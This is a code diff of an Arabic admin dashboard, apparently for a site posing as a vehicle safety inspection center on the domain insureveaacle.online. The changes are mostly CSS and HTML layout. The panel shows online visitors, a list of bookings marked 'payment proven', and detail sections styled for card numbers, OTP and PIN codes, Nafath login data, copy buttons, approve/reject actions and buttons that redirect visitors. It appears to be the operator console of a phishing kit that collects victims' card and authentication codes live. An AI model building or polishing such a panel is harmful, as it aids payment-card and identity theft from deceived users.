@@ -13,41 +13,40 @@
 body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#111827;font-size:14px}
 
 /* ===== LOGIN ===== */
-#loginPage{
+.sec-login{
   height:100vh;
   display:flex;
   align-items:center;
   justify-content:center;
   overflow:auto;
   background:#fff;
-  font-family:'Cairo',sans-serif;
 }
-.sec-login-inner{
+.sec-login .div-logo img{
+  width:200px;
+  height:60px;
+  object-fit:contain;
+  margin-bottom:16px;
+}
+.sec-login .div-form{
   box-shadow:0px 0px 0px 0.5px rgba(50,50,93,.1),0px 2px 5px 0px rgba(50,50,93,.1),0px 1px 1.5px 0px rgba(0,0,0,.07);
   border-radius:7px;
-  padding:30px 24px;
-  width:320px;
+  padding:24px 20px;
+  width:300px;
   background:#fff;
   text-align:center;
 }
-.sec-login-inner .div-logo img{
-  width:180px;
-  height:55px;
-  object-fit:contain;
-  margin-bottom:20px;
-}
-.sec-login-inner h5{
+.sec-login .div-form h5{
   font-size:16px;
   font-weight:700;
   color:#233f48;
-  margin-bottom:6px;
+  margin-bottom:4px;
 }
-.sec-login-inner p{
+.sec-login .div-form p{
   font-size:12px;
   color:#6b7280;
-  margin-bottom:20px;
+  margin-bottom:18px;
 }
-.sec-login-inner label{
+.sec-login .div-form label{
   display:block;
   font-size:12px;
   font-weight:700;
@@ -55,7 +54,7 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   margin-bottom:5px;
   text-align:right;
 }
-.sec-login-inner input[type=password]{
+.sec-login .div-form input[type=password]{
   width:100%;
   padding:10px 13px;
   border:1.5px solid #e5e7eb;
@@ -67,7 +66,7 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   margin-bottom:14px;
   transition:border-color .2s;
 }
-.sec-login-inner input[type=password]:focus{border-color:#04aa6d}
+.sec-login .div-form input[type=password]:focus{border-color:#04aa6d}
 .lerr{color:#ef4444;font-size:12px;text-align:center;margin-bottom:10px;display:none}
 .lbtn{
   width:100%;
@@ -81,18 +80,22 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   cursor:pointer;
   font-family:inherit;
   transition:background .2s;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:7px;
 }
 .lbtn:hover{background:#0eb074}
 
 /* ===== ADMIN PAGE ===== */
-#adminPage{display:none;min-height:100vh;background:#fff;font-family:'Cairo',sans-serif;}
+#adminPage{display:none;min-height:100vh;background:#f1f1f1;font-family:'Cairo',sans-serif;}
 
 /* Navbar */
 .ad-navbar{
   background:#233f48;
-  color:white;
+  color:white !important;
   padding:0 20px;
-  height:64px;
+  height:60px;
   display:flex;
   align-items:center;
   justify-content:space-between;
@@ -101,15 +104,11 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   z-index:200;
 }
 .ad-navbar .logo-img{
-  width:140px;
+  width:150px;
   height:40px;
   object-fit:contain;
 }
-.ad-navbar .nav-title{
-  font-size:15px;
-  font-weight:700;
-  color:#fff;
-}
+.ad-navbar a:not(.dropdown-item){color:white !important;}
 .ad-navbar .nav-right{
   display:flex;
   align-items:center;
@@ -155,77 +154,44 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 .lout:hover{background:rgba(255,255,255,.25)}
 
-/* Stats bar */
-.stats-bar{
-  background:#fff;
-  padding:12px 20px;
-  display:flex;
-  gap:12px;
-  border-bottom:1px solid #e8e8e7;
-  flex-wrap:wrap;
-}
-.sc{
-  background:#f1f4f8;
-  border-radius:10px;
-  padding:10px 16px;
-  display:flex;
-  align-items:center;
-  gap:10px;
-  flex:1;
-  min-width:130px;
-}
-.si{
-  width:36px;
-  height:36px;
-  border-radius:9px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-shrink:0;
-}
-.si svg{width:18px;height:18px;fill:none;stroke:currentColor}
-.si-b{background:#dbeafe;color:#2563eb}
-.si-g{background:#dcfce7;color:#16a34a}
-.si-o{background:#ffedd5;color:#ea580c}
-.si-p{background:#ede9fe;color:#7c3aed}
-.si-t{background:#ccfbf1;color:#0d9488}
-.sn{font-size:20px;font-weight:900;color:#233f48;line-height:1}
-.sl{font-size:11px;color:#6b7280;margin-top:2px;font-weight:600}
-
-/* Main layout: sidebar + content */
-.sec-admin-tmp{
+/* ===== MAIN LAYOUT ===== */
+section.sec-admin-tmp{
   position:relative;
   background:#fff;
   font-family:'Cairo',sans-serif;
   font-size:14px;
 }
+section.sec-admin-tmp::after{content:"";clear:both;display:table;}
+
 .sec-admin-tmp .sidebar-container{
-  min-height:calc(100vh - 120px);
+  min-height:calc(100vh - 60px);
   display:flex;
 }
+
+/* Sidebar */
 .sec-admin-tmp .sidebar-container .sidebar{
   margin:0;
   padding:10px;
-  width:220px;
-  min-width:220px;
+  width:230px;
+  min-width:230px;
   background-color:#f1f1f1;
   position:sticky;
-  top:64px;
-  height:calc(100vh - 64px);
+  top:60px;
+  height:calc(100vh - 60px);
   overflow-y:auto;
-  border-left:1px solid #e8e8e7;
+  border-left:1px solid #e0e0e0;
 }
-.sidebar-header{
-  padding:8px 6px;
+.sidebar-top{
+  padding:6px 4px 8px;
   font-size:12px;
   font-weight:700;
   color:#6b7280;
   display:flex;
   align-items:center;
   justify-content:space-between;
-  margin-bottom:4px;
+  margin-bottom:6px;
 }
-.sidebar-search{
+.sidebar-search-wrap{
   display:flex;
   align-items:center;
   gap:6px;
@@ -235,8 +201,8 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   padding:6px 10px;
   margin-bottom:8px;
 }
-.sidebar-search svg{width:13px;height:13px;fill:none;stroke:#9ca3af;flex-shrink:0}
-.sidebar-search input{
+.sidebar-search-wrap svg{width:13px;height:13px;fill:none;stroke:#9ca3af;flex-shrink:0}
+.sidebar-search-wrap input{
   border:none;
   background:transparent;
   font-size:12px;
@@ -244,6 +210,7 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   width:100%;
   font-family:inherit;
 }
+
 .sec-admin-tmp .sidebar-container .sidebar .user-div{
   display:flex;
   align-items:center;
@@ -252,9 +219,9 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   border-radius:7px;
   cursor:pointer;
   margin-bottom:3px;
-  transition:background .15s ease,box-shadow .15s ease,color .15s ease;
-  border:1px solid #e6e6e6;
-  box-shadow:0px 0px 1px rgba(0,0,0,.03),0px 1px 1px rgba(0,0,0,.02);
+  transition:background .15s ease,border .15s ease,box-shadow .15s ease,color .15s ease;
+  border:1px solid #e6e6e6 !important;
+  box-shadow:0px 1px 1px rgba(0,0,0,.03),0px 3px 6px rgba(0,0,0,.02) !important;
   background:#fff;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div .info-user{
@@ -267,41 +234,41 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div .info-user .new-action{
   display:inline-block;
-  min-width:8px;
-  min-height:8px;
+  min-width:10px;
+  min-height:10px;
   background-color:green;
   border-radius:10px;
   flex-shrink:0;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div .info-user .name{
-  width:120px;
+  width:140px;
   overflow:hidden;
   text-overflow:ellipsis;
   white-space:nowrap;
-  font-size:12px;
+  font-size:13px;
   font-weight:600;
   color:#233f48;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div .status-user{
   color:#404040;
-  font-size:11px;
+  font-size:13px;
   flex-shrink:0;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div .status-user .payment_proven{
   color:blue;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div.selected{
-  background-color:#04aa6d;
+  background-color:#04aa6d !important;
   color:white;
-  border-color:#04aa6d;
+  border-color:#04aa6d !important;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div.selected .info-user .name{
   color:#fff;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div:hover:not(.selected){
-  background-color:#0eb074;
+  background-color:#0eb074 !important;
   color:white;
-  border-color:#0eb074;
+  border-color:#0eb074 !important;
 }
 .sec-admin-tmp .sidebar-container .sidebar .user-div:hover:not(.selected) .info-user .name{
   color:#fff;
@@ -313,259 +280,90 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   min-height:100%;
   padding:16px;
   overflow-y:auto;
+  background:#fff;
 }
 
-/* Content top bar */
-.content-topbar{
+/* Content header */
+.content-hdr{
   display:flex;
   align-items:center;
   justify-content:space-between;
   margin-bottom:14px;
+  padding-bottom:12px;
+  border-bottom:1px solid #f1f1f1;
 }
-.content-title{
+.content-hdr-title{
   font-size:15px;
   font-weight:800;
   color:#233f48;
-  display:flex;
-  align-items:center;
-  gap:7px;
 }
-.content-title svg{fill:none;stroke:currentColor;width:18px;height:18px}
-.content-actions{display:flex;gap:8px;align-items:center}
-.rbtn{
-  display:flex;
-  align-items:center;
-  gap:5px;
-  padding:7px 13px;
-  background:#f1f1f1;
-  border:1.5px solid #e6e6e6;
-  border-radius:8px;
-  font-size:12px;
+
+/* Cards inside content */
+.sec-admin-tmp .sidebar-container div.content .bc-color-card_payment{
+  background-color:RGBA(248,249,250,0.5) !important;
+}
+.sec-admin-tmp .sidebar-container div.content .bc-color-card_motsal{
+  background-color:RGBA(248,249,250,1) !important;
+}
+.sec-admin-tmp .sidebar-container div.content .bc-color-card_nafath{
+  background-color:#f1f1f1;
+}
+.sec-admin-tmp .sidebar-container div.content .card-header{
+  color:#777;
   font-weight:600;
-  cursor:pointer;
-  color:#6b7280;
-  font-family:inherit;
-  transition:background .2s;
+  font-size:14px;
 }
-.rbtn:hover{background:#e8e8e7}
-.rbtn svg{fill:none;stroke:currentColor;width:13px;height:13px}
-
-/* Cards grid */
-.cards-grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
-  gap:12px;
+.sec-admin-tmp .sidebar-container div.content .card-body{
+  font-size:14px !important;
 }
-
-/* Booking card */
-.bk-card{
-  background:#fff;
-  border-radius:12px;
-  border:1px solid #e6e6e6;
-  box-shadow:0px 1px 3px rgba(0,0,0,.04);
-  overflow:hidden;
-  cursor:pointer;
-  transition:box-shadow .2s,border-color .2s;
+.sec-admin-tmp .sidebar-container div.content .card-body .card-title{
+  font-size:12px !important;
+  color:black;
+  font-weight:bold !important;
 }
-.bk-card:hover{
-  box-shadow:0px 4px 12px rgba(0,0,0,.1);
-  border-color:#04aa6d;
-}
-.bk-card-header{
-  background:#f1f4f8;
-  padding:10px 14px;
+.sec-admin-tmp .sidebar-container div.content .card-body .div-sub-forms{
   display:flex;
-  align-items:center;
-  justify-content:space-between;
-  border-bottom:1px solid #e6e6e6;
-}
-.bk-card-name{
-  font-size:13px;
-  font-weight:700;
-  color:#233f48;
-}
-.bk-card-body{
-  padding:10px 14px;
-}
-.bk-field{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  padding:4px 0;
-  border-bottom:1px solid #f1f1f1;
-  font-size:12px;
-}
-.bk-field:last-child{border-bottom:none}
-.bk-lbl{color:#6b7280;font-weight:500}
-.bk-val{font-weight:600;color:#233f48}
-.bk-card-footer{
-  padding:8px 14px;
-  border-top:1px solid #f1f1f1;
-  display:flex;
-  gap:6px;
-  flex-wrap:wrap;
-}
-
-/* Badges */
-.badge{display:inline-flex;align-items:center;gap:3px;padding:2px 10px;border-radius:20px;font-size:10px;font-weight:700}
-.b-new{background:#dbeafe;color:#2563eb}
-.b-ok{background:#dcfce7;color:#16a34a}
-.b-rej{background:#fee2e2;color:#ef4444}
-.b-pend{background:#ffedd5;color:#ea580c}
-.b-card{background:#ede9fe;color:#7c3aed}
-.b-otp{background:#fef3c7;color:#d97706}
-.b-pin{background:#ccfbf1;color:#0d9488}
-
-@keyframes rowFlash{0%{background:transparent}30%{background:#fef9c3}60%{background:#dcfce7}100%{background:transparent}}
-.rflash{animation:rowFlash 1.5s ease}
-
-/* Action buttons */
-.bdet{
-  padding:5px 11px;
-  background:#04aa6d;
-  color:#fff;
-  border:none;
-  border-radius:7px;
-  font-size:11px;
-  font-weight:700;
-  cursor:pointer;
-  font-family:inherit;
-  display:inline-flex;
-  align-items:center;
-  gap:4px;
-  transition:background .2s;
-}
-.bdet:hover{background:#0eb074}
-.bdet svg{fill:none;stroke:currentColor;width:12px;height:12px}
-
-/* Nav buttons */
-.bnav-wrap{position:relative;display:inline-block}
-.bnav{
-  padding:5px 9px;
-  background:#f1f1f1;
-  color:#6b7280;
-  border:1.5px solid #e6e6e6;
-  border-radius:7px;
-  font-size:11px;
-  cursor:pointer;
-  font-family:inherit;
-  display:inline-flex;
-  align-items:center;
-  gap:3px;
-  transition:background .2s;
-}
-.bnav:hover{background:#e8e8e7}
-.bnav svg{fill:none;stroke:currentColor;width:12px;height:12px}
-.ndrop{
-  display:none;
-  position:absolute;
-  top:calc(100% + 4px);
-  left:0;
-  background:#fff;
-  border-radius:12px;
-  box-shadow:0 10px 30px rgba(0,0,0,.12);
-  z-index:300;
-  min-width:185px;
-  padding:5px;
-  border:1px solid #e6e6e6;
-}
-.ndrop.open{display:block}
-.nitem{
-  display:flex;
-  align-items:center;
-  gap:8px;
-  padding:8px 10px;
-  border-radius:8px;
-  font-size:12px;
-  color:#374151;
-  cursor:pointer;
-  transition:background .15s;
-  font-weight:600;
-}
-.nitem:hover{background:#f1f1f1}
-.nitem-ic{
-  width:26px;
-  height:26px;
-  border-radius:6px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-shrink:0;
-}
-.nitem-ic svg{width:13px;height:13px;fill:none;stroke:currentColor}
-
-.empty-state{
-  text-align:center;
-  padding:60px 20px;
-  color:#9ca3af;
-}
-.empty-state svg{
-  width:50px;
-  height:50px;
-  margin:0 auto 12px;
-  display:block;
-  opacity:.3;
-  fill:none;
-  stroke:currentColor;
-}
-.empty-state p{font-size:13px;font-weight:600}
-
-/* ===== MODAL ===== */
-.moverlay{
-  display:none;
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.6);
-  z-index:1000;
-  align-items:flex-start;
-  justify-content:center;
-  padding:20px;
-  overflow-y:auto;
-}
-.moverlay.open{display:flex}
-.modal{
-  background:#fff;
-  border-radius:16px;
   width:100%;
-  max-width:520px;
-  max-height:90vh;
-  overflow-y:auto;
-  box-shadow:0 25px 60px rgba(0,0,0,.25);
-  direction:rtl;
-  margin:auto;
+  overflow:auto;
+  gap:7px;
+  padding-bottom:5px;
 }
-.mhdr{
-  padding:16px 20px;
-  border-bottom:1px solid #e6e6e6;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  position:sticky;
-  top:0;
-  background:#233f48;
-  z-index:10;
-  border-radius:16px 16px 0 0;
+.sec-admin-tmp .sidebar-container div.content .card-body .div-sub-forms .div-sub-form{
+  width:230px;
+  min-width:230px;
+  border-radius:5px;
+  border:1px solid #e6e6e6 !important;
+  box-shadow:0px 1px 1px rgba(0,0,0,.03),0px 3px 6px rgba(0,0,0,.02) !important;
+  padding:5px 5px;
+  word-break:break-all;
 }
-.mhdr-t{font-size:15px;font-weight:800;color:#fff}
-.mhdr-s{font-size:11px;color:rgba(255,255,255,.7);font-family:monospace;direction:ltr;font-weight:600}
-.mclose{
-  width:30px;
-  height:30px;
-  border-radius:8px;
-  background:rgba(255,255,255,.15);
-  border:none;
-  cursor:pointer;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#fff;
-  transition:all .2s;
+.sec-admin-tmp .sidebar-container div.content .card-body .div-sub-forms .div-sub-form-w-big{
+  width:270px !important;
+  min-width:270px !important;
 }
-.mclose:hover{background:rgba(255,255,255,.3)}
-.mclose svg{width:14px;height:14px;fill:none;stroke:currentColor}
-.mbody{padding:16px 20px 20px}
+.sec-admin-tmp .sidebar-container div.content .card-body .div-item-field{
+  height:auto;
+}
+.sec-admin-tmp .sidebar-container div.content .card-body .div-item-field p{
+  margin:0.2rem !important;
+  font-size:18px;
+  font-weight:bold;
+}
+.sec-admin-tmp .sidebar-container div.content .card-body .div-item-field .label-form{
+  color:#777;
+  font-size:13px;
+  font-weight:400;
+}
+.sec-admin-tmp .sidebar-container div.content .card-body.card-payment .div-item-field p:not(.label-form){
+  transition:background .15s ease,border .15s ease,box-shadow .15s ease,color .15s ease;
+  border:1px solid #e6e6e6 !important;
+  box-shadow:0px 0px 1px rgba(0,0,0,.03),0px 1px 1px rgba(0,0,0,.02) !important;
+  padding:3px;
+  border-radius:5px !important;
+  min-height:33px;
+}
 
-/* Section header */
+/* ===== CONTENT DETAIL SECTIONS ===== */
 .msec-hdr{
   font-size:13px;
   font-weight:700;
@@ -577,7 +375,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 .msec-hdr svg{fill:none;stroke:currentColor}
 
-/* Field list */
 .flist{
   background:#f9fafb;
   border-radius:12px;
@@ -598,7 +395,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 .fval{font-size:12px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
 .fval.ar{direction:rtl;text-align:right}
 
-/* Card section */
 .card-sec{margin-bottom:16px}
 .card-list{
   background:#f9fafb;
@@ -619,7 +415,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 .card-val{font-size:12px;font-weight:600;color:#1f2937;direction:ltr;text-align:left;display:flex;align-items:center;gap:6px}
 .card-num{font-family:'Courier New',monospace;letter-spacing:1px;font-size:13px;font-weight:700}
 
-/* Copy button */
 .cpbtn{
   background:none;
   border:none;
@@ -634,7 +429,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 .cpbtn:hover{color:#04aa6d}
 .cpbtn svg{width:13px;height:13px;fill:none;stroke:currentColor}
 
-/* OTP section */
 .otp-sec{
   background:#f9fafb;
   border-radius:12px;
@@ -655,7 +449,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 .pin-val{font-size:18px;font-weight:900;font-family:'Courier New',monospace;letter-spacing:4px;color:#0d9488;display:flex;align-items:center;gap:6px}
 .otp-wait{font-size:12px;color:#9ca3af;font-style:italic}
 
-/* Waiting */
 .waiting{
   display:flex;
   align-items:center;
@@ -669,15 +462,11 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   border:1px solid #e6e6e6;
 }
 .spin svg{
-  width:16px;
-  height:16px;
-  fill:none;
-  stroke:#9ca3af;
+  width:16px;height:16px;fill:none;stroke:#9ca3af;
   animation:spin 1s linear infinite;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* Actions */
 .act-sec{margin-bottom:16px}
 .act-btns{display:flex;gap:8px}
 .abtn{
@@ -716,7 +505,6 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 .rej-msg input:focus{border-color:#04aa6d}
 
-/* Nav buttons in modal */
 .nav-btns{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
 .nbp{
   padding:7px 12px;
@@ -730,12 +518,12 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 .nbp:hover{opacity:.8}
 
-/* Footer dates */
 .mfooter{
   background:#f9fafb;
   border-radius:12px;
   padding:0 14px;
   border:1px solid #e6e6e6;
+  margin-bottom:16px;
 }
 .mfdate{
   display:flex;
@@ -748,6 +536,25 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 .mfdate:last-child{border-bottom:none}
 .mfdate-l{color:#6b7280;font-weight:500}
 .mfdate-v{color:#374151;font-weight:600;direction:ltr}
+
+/* Empty / placeholder */
+.empty-content{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  height:60vh;
+  color:#9ca3af;
+  text-align:center;
+}
+.empty-content svg{
+  width:60px;height:60px;
+  fill:none;stroke:currentColor;
+  opacity:.25;
+  margin-bottom:14px;
+}
+.empty-content p{font-size:14px;font-weight:600}
+.empty-content small{font-size:12px;margin-top:4px}
 
 /* Toast */
 #toast{
@@ -769,18 +576,17 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 }
 #toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 
-/* Pulse badge */
 @keyframes pbx{0%{box-shadow:0 0 0 0 rgba(4,170,109,.4)}70%{box-shadow:0 0 0 8px rgba(4,170,109,0)}100%{box-shadow:0 0 0 0 rgba(4,170,109,0)}}
 .pbx{animation:pbx .8s ease}
 
 /* Responsive */
-@media(max-width:900px){
+@media screen and (max-width:900px){
   .sec-admin-tmp .sidebar-container{flex-direction:column}
   .sec-admin-tmp .sidebar-container .sidebar{
     width:100%;
     height:auto;
     position:sticky;
-    top:64px;
+    top:60px;
     z-index:10;
     display:flex;
     overflow-x:auto;
@@ -794,29 +600,29 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
     min-width:160px;
     margin-bottom:0;
   }
-  .sidebar-header,.sidebar-search{display:none}
-  .stats-bar{padding:10px 12px}
-  .sc{min-width:100px;padding:8px 12px}
+  .sidebar-top,.sidebar-search-wrap{display:none}
 }
-@media(max-width:450px){
+@media screen and (max-width:450px){
   .sec-admin-tmp .sidebar-container .sidebar{
     display:block;
-    height:200px;
+    height:230px;
     overflow-y:auto;
     overflow-x:hidden;
   }
   .sec-admin-tmp .sidebar-container .sidebar .user-div{
     min-width:unset;
   }
-  .cards-grid{grid-template-columns:1fr}
+}
+@media (max-width:900px){
+  .sec-admin-tmp .sidebar-container{flex-direction:column}
 }
 </style>
 </head>
 <body>
 
 <!-- ===== LOGIN PAGE ===== -->
-<div id="loginPage">
-  <div class="sec-login-inner">
+<div id="loginPage" class="sec-login">
+  <div class="div-form">
     <div class="div-logo">
       <img src="https://insureveaacle.online/assets/images/logo.svg" alt="مركز سلامة المركبات" onerror="this.style.display='none'">
     </div>
@@ -826,7 +632,7 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
     <label>كلمة المرور</label>
     <input type="password" id="passInp" placeholder="••••••••" onkeydown="if(event.key==='Enter')doLogin()">
     <button class="lbtn" onclick="doLogin()">
-      <i class="fas fa-sign-in-alt ml-2"></i>
+      <i class="fas fa-sign-in-alt"></i>
       دخول
     </button>
   </div>
@@ -837,55 +643,31 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
 
   <!-- Navbar -->
   <nav class="ad-navbar">
-    <div class="d-flex align-items-center gap-3">
+    <div class="d-flex align-items-center" style="gap:12px">
       <img src="https://insureveaacle.online/assets/images/logo.svg" class="logo-img" alt="Logo" onerror="this.style.display='none'">
-      <span class="nav-title">لوحة التحكم</span>
+      <span style="font-size:15px;font-weight:700;color:#fff">لوحة التحكم</span>
     </div>
     <div class="nav-right">
       <div class="vctr"><div class="vdot"></div><span id="vcnt">0</span> زائر</div>
       <div class="cbadge"><div class="cdot" id="cdot"></div><span id="ctxt">غير متصل</span></div>
       <button class="lout" onclick="doLogout()">
-        <i class="fas fa-sign-out-alt ml-1"></i>
+        <i class="fas fa-sign-out-alt"></i>
         خروج
       </button>
     </div>
   </nav>
 
-  <!-- Stats bar -->
-  <div class="stats-bar">
-    <div class="sc">
-      <div class="si si-b"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></div>
-      <div><div class="sn" id="stTotal">0</div><div class="sl">إجمالي الحجوزات</div></div>
-    </div>
-    <div class="sc">
-      <div class="si si-p"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg></div>
-      <div><div class="sn" id="stToday">0</div><div class="sl">حجوزات اليوم</div></div>
-    </div>
-    <div class="sc">
-      <div class="si si-g"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
-      <div><div class="sn" id="stOk">0</div><div class="sl">مكتملة</div></div>
-    </div>
-    <div class="sc">
-      <div class="si si-o"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
-      <div><div class="sn" id="stPend">0</div><div class="sl">قيد المعالجة</div></div>
-    </div>
-    <div class="sc">
-      <div class="si si-t"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div>
-      <div><div class="sn" id="stVis">0</div><div class="sl">زوار متصلون</div></div>
-    </div>
-  </div>
-
   <!-- Main: Sidebar + Content -->
   <section class="sec-admin-tmp">
-    <div class="sidebar-container d-flex">
+    <div class="sidebar-container">
 
       <!-- Sidebar -->
       <div class="sidebar">
-        <div class="sidebar-header">
-          <span>الحجوزات النشطة</span>
+        <div class="sidebar-top">
+          <span>قائمة الحجوزات</span>
           <span id="pendCount" style="background:#04aa6d;color:#fff;border-radius:20px;padding:1px 8px;font-size:10px">0</span>
         </div>
-        <div class="sidebar-search">
+        <div class="sidebar-search-wrap">
           <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
           <input type="text" id="sidebarSearch" placeholder="بحث..." oninput="filterSidebar()">
         </div>
@@ -895,30 +677,11 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
       </div>
 
       <!-- Content -->
-      <div class="content">
-        <div class="content-topbar">
-          <div class="content-title">
-            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-            قائمة الحجوزات
-          </div>
-          <div class="content-actions">
-            <div class="rbtn" style="background:#fff;border:1.5px solid #e6e6e6;border-radius:9px;padding:7px 12px;display:flex;align-items:center;gap:7px;width:200px">
-              <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px;color:#9ca3af;flex-shrink:0;fill:none;stroke:currentColor"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
-              <input type="text" id="srchInp" placeholder="بحث..." oninput="renderB()" style="border:none;background:transparent;font-size:12px;outline:none;width:100%;font-family:inherit">
-            </div>
-            <button class="rbtn" onclick="loadB()">
-              <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
-              تحديث
-            </button>
-          </div>
-        </div>
-
-        <!-- Cards grid -->
-        <div class="cards-grid" id="cardsGrid">
-          <div class="empty-state">
-            <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-            <p>لا توجد حجوزات بعد</p>
-          </div>
+      <div class="content" id="ContainerUserForms">
+        <div class="empty-content">
+          <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+          <p>اختر حجزاً من القائمة</p>
+          <small>انقر على أي حجز في الشريط الجانبي لعرض تفاصيله</small>
         </div>
       </div>
 
@@ -926,40 +689,21 @@ body{font-family:'Cairo',sans-serif;background:#f1f1f1;direction:rtl;color:#1118
   </section>
 </div>
 
-<!-- MODAL -->
-<div class="moverlay" id="modal" onclick="if(event.target===this)closeM()">
-  <div class="modal" onclick="event.stopPropagation()">
-    <div class="mhdr">
-      <div>
-        <div class="mhdr-t">تفاصيل الحجز</div>
-        <div class="mhdr-s" id="mSub"></div>
-      </div>
-      <button class="mclose" onclick="closeM()">
-        <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 18L18 6M6 6l12 12"/></svg>
-      </button>
-    </div>
-    <div class="mbody" id="mbody"></div>
-  </div>
-</div>
-
 <!-- TOAST -->
 <div id="toast"></div>
+<!-- صوت -->
